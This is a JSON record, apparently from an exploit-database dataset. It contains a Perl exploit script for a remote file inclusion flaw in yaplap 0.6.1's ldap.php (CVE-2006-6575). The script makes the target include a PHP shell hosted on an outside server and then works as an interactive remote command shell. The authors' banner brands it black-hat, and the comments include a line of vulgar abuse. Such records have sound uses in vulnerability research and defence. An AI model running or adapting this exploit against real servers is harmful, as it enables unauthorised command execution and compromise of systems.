{
  "id": "2930",
  "title": "yaplap 0.6.1b - &#039;ldap.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6575",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#yaplap Remote File Inclusion Vulnerablity\r\n#Version 0.6 & 0.6.1\r\n#Class = Remote File Inclusion\r\n#Bug Found & Exploit [c]oded By  DeltahackingTEAM      (Dr.Trojan&Dr.Pantagon)\r\n#Download:http://osdn.dl.sourceforge.net/sourceforge/yaplap/yaplap-0.6.1.tar.gz\r\n#Vulnerable Code:include $LOGIN_style.\"_form.php\";\r\n#[Path]/Index.php?site_main_path=\r\n#Exploit: ldap.php?LOGIN_style=[shell]\r\n# FUCK Your Mother &Your SisTer=>>> z_zer0c00l\r\nuse LWP::UserAgent;\r\n\r\n$target=@ARGV[0];\r\n$shellsite=@ARGV[1];\r\n$cmdv=@ARGV[2];\r\n\r\nif($target!~/http:\\/\\// || $shellsite!~/http:\\/\\// || !$cmdv)\r\n{\r\n       usg()\r\n}\r\nheader();\r\n\r\n\r\nwhile()\r\n{\r\nprint \"[Shell] \\$\";\r\nwhile (<STDIN>)\r\n{\r\n       $cmd=$_;\r\n       chomp($cmd);\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$req = HTTP::Request->new(GET=>$target.'ldap.php?LOGIN_style='.$shellsite='.?&'.$cmdv.'='.$cmd)or die \"\\n\\n Failed to Connect, Try again!\\n\";\r\n$res = $xpl->request($req);\r\n$info = $res->content;\r\n$info =~ tr/[\\n]/[&#234;]/;\r\n\r\n\r\nif (!$cmd) {\r\nprint \"\\nEnter a Command\\n\\n\"; $info =\"\";\r\n}\r\n\r\n\r\nelsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:\r\nCannot execute a blank command in <b>/)\r\n{\r\nprint \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";\r\nexit;\r\n}\r\n\r\n\r\nelsif ($info =~/^<br.\\/>.<b>Warning/) {\r\nprint \"\\nInvalid Command\\n\\n\";\r\n};\r\n\r\n\r\nif($info =~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n{\r\n$final = $1;\r\n$final=~ tr/[&#234;]/[\\n]/;\r\nprint \"\\n$final\\n\";\r\nlast;\r\n}\r\n\r\nelse {\r\nprint \"[shell] \\$\";\r\n}\r\n}\r\n}\r\nlast;\r\n\r\n\r\n\r\nsub header()\r\n{\r\nprint q{\r\n*******************************************************************************\r\n         ***(#$#$#$#$#$=>http://www.deltasecurity.ir<=#$#$#$#$#$)***\r\n\r\nVulnerablity found By: DeltahackingTEAM\r\n\r\nExploit [c]oded By: Dr.Trojan\r\n\r\nDr.Trojan,HIV++,D_7j,Lord,VPc,Tanha,Dr.Pantagon\r\n\r\nhttp://advistory.deltasecurity.ir\r\n\r\nWe Server(99/999% Secure) <<<<<www.takserver.ir>>>>>\r\n\r\nEmail:Dr.Trojan[A]deltasecurity.ir 0nly Black Hat\r\n******************************************************************************\r\n}\r\n}\r\nsub usg()\r\n{\r\nheader();\r\nprint q{\r\nUsage: perl delta.pl [tucows fullpath] [Shell Location] [Shell Cmd]\r\n[yaplap FULL PATH] - Path to site exp. www.site.com\r\n[shell Location] - Path to shell exp. d4wood.by.ru/cmd.gif\r\n[shell Cmd Variable] - Command variable for php shell\r\nExample: perl delta.pl http://www.site.com/[yaplap]/\r\n********************************************************************************\r\n};\r\n\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-12-14]",
  "url": "https://www.exploit-db.com/exploits/2930"
}